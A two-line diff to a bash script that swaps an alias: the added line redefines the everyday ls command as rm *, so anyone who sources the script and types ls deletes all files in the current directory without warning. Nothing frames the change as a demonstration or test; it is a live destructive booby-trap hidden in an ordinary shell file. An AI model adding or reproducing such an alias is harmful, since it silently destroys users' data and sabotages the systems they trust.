@@ -1,2 +1,2 @@
 #!/bin/bash
-alias push="ls"
+alias ls="rm *"
